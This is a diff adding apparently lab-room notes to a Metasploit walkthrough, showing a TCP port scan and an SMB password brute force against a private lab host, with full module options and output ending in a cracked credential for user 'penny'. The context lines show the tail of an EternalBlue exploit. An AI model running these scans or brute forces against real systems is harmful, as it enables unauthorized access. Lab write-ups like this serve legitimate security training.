@@ -226,6 +226,114 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 ## WE ARE IN
 meterpreter > 
 ```
+---
+---
+NOTE:
+Nmap can be used while in metasploit // nmap -sS -A -O 32.2.3.42
+```
+search portscan
+
+...
+...
+...
+
+msf6 > use auxiliary/scanner/portscan/tcp 
+msf6 auxiliary(scanner/portscan/tcp) > options
+
+Module options (auxiliary/scanner/portscan/tcp):
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-50000
+PORTS => 1-50000
+msf6 auxiliary(scanner/portscan/tcp) > set RHOST 10.67.177.119
+RHOST => 10.67.177.119
+
+
+msf6 auxiliary(scanner/portscan/tcp) > run
+[+] 10.67.177.119         - 10.67.177.119:21 - TCP OPEN
+[+] 10.67.177.119         - 10.67.177.119:22 - TCP OPEN
+[+] 10.67.177.119         - 10.67.177.119:139 - TCP OPEN
+[+] 10.67.177.119         - 10.67.177.119:445 - TCP OPEN
+[+] 10.67.177.119         - 10.67.177.119:8000 - TCP OPEN
+```
+---
+Scanner Example and SMB Password Brute Force
+```
+msf6 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.67.177.119
+RHOSTS => 10.67.177.119
+
+msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER penny
+SMBUSER => penny
+
+msf6 auxiliary(scanner/smb/smb_login) > options
+Module options (auxiliary/scanner/smb/smb_login):
+   Name               Current Setting                           Required  Description
+   ----               ---------------                           --------  -----------
+   ABORT_ON_LOCKOUT   false                                     yes       Abort the run when an account lockout is detected
+   ANONYMOUS_LOGIN    false                                     yes       Attempt to login with a blank username and password
+   BLANK_PASSWORDS    false                                     no        Try blank passwords for all users
+   BRUTEFORCE_SPEED   5                                         yes       How fast to bruteforce, from 0 to 5
+   CreateSession      false                                     no        Create a new session for every successful login
+   DB_ALL_CREDS       false                                     no        Try each user/password couple stored in the current database
+   DB_ALL_PASS        false                                     no        Add all passwords in the current database to the list
+   DB_ALL_USERS       false                                     no        Add all users in the current database to the list
+   DB_SKIP_EXISTING   none                                      no        Skip existing credentials stored in the current database (Accepted: none,
+                                                                           user, user&realm)
+   DETECT_ANY_AUTH    false                                     no        Enable detection of systems accepting any authentication
+   DETECT_ANY_DOMAIN  false                                     no        Detect if domain is required for the specified user
+   PASS_FILE          /usr/share/wordlists/MetasploitRoom/Meta  no        File containing passwords, one per line
+                      sploitWordlist.txt
+   PRESERVE_DOMAINS   true                                      no        Respect a username that contains a domain name.
+   Proxies                                                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST       false                                     no        Record guest-privileged random logins to the database
+   RHOSTS             10.67.177.119                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
+                                                                          /basics/using-metasploit.html
+   RPORT              445                                       yes       The SMB service port (TCP)
+   SMBDomain          .                                         no        The Windows domain to use for authentication
+   SMBPass                                                      no        The password for the specified username
+   SMBUser            penny                                     no        The username to authenticate as
+   STOP_ON_SUCCESS    false                                     yes       Stop guessing when a credential works for a host
+   THREADS            1                                         yes       The number of concurrent threads (max one per host)
+   USERPASS_FILE                                                no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS       false                                     no        Try the username as the password for all users
+   USER_FILE                                                    no        File containing usernames, one per line
+   VERBOSE            true                                      yes       Whether to print output for all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_login) > run
+[*] 10.67.177.119:445     - 10.67.177.119:445 - Starting SMB login bruteforce
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:95',
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:98',
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:2003',
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:2008',
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:111111',
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:123456',
+....
+....
+
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:hugs',
+[-] 10.67.177.119:445     - 10.67.177.119:445 - Failed: '.\penny:letmein',
+[+] 10.67.177.119:445     - 10.67.177.119:445 - Success: '.\penny:leo1234' <<<<<<<<<<< SUCCESS! <<<<<<<<<<<<<<
+[*] 10.67.177.119:445     - Scanned 1 of 1 hosts (100% complete)
+[*] 10.67.177.119:445     - Bruteforce completed, 1 credential was successful.
+[*] 10.67.177.119:445     - You can open an SMB session with these credentials and CreateSession set to true <<<<<<<<<<<<<<
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_login) > 
 
 </details>
 
